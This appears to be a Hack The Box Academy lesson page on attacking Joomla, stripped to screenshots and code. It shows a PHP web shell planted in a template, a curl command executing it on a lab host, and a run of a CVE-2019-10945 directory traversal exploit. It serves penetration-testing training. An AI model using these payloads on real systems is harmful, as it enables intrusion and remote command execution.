<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/113/section/1210
// Platform Version: V1
// Module ID: 113
// Module Name: Attacking Common Applications
// Module Difficulty: Medium
// Section ID: 1210
// Section Title: Attacking Joomla
// Page Title: Hack The Box - Academy
// Page Number: 06
-->

# Attacking Joomla

**Module Name:** Attacking Common Applications **Page Number:** 06

#### 

#### ATTACKING COMMON APPLICATIONS

# Attacking Joomla

## Abusing Built-In Functionality

![https://academy.hackthebox.com/storage/modules/113/joomla_admin.png](https://academy.hackthebox.com/storage/modules/113/joomla_admin.png)

![https://academy.hackthebox.com/storage/modules/113/joomla_templates.png](https://academy.hackthebox.com/storage/modules/113/joomla_templates.png)

![https://academy.hackthebox.com/storage/modules/113/joomla_customise.png](https://academy.hackthebox.com/storage/modules/113/joomla_customise.png)

``` php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

![https://academy.hackthebox.com/storage/modules/113/joomla_edited.png](https://academy.hackthebox.com/storage/modules/113/joomla_edited.png)

``` shell-session
[!bash!]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Leveraging Known Vulnerabilities

``` shell-session
[!bash!]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
# Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
# Web Site: Haboob.sa
# Email: research@haboob.sa
# Versions: Joomla 1.5.0 through Joomla 3.9.4
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    
 _    _          ____   ____   ____  ____  
| |  | |   /\   |  _ \ / __ \ / __ \|  _ \ 
| |__| |  /  \  | |_) | |  | | |  | | |_) |
|  __  | / /\ \ |  _ <| |  | | |  | |  _ < 
| |  | |/ ____ \| |_) | |__| | |__| | |_) |
|_|  |_/_/    \_\____/ \____/ \____/|____/ 
                                                                       


administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt
```

## Moving On

# 

# 

#### Questions

####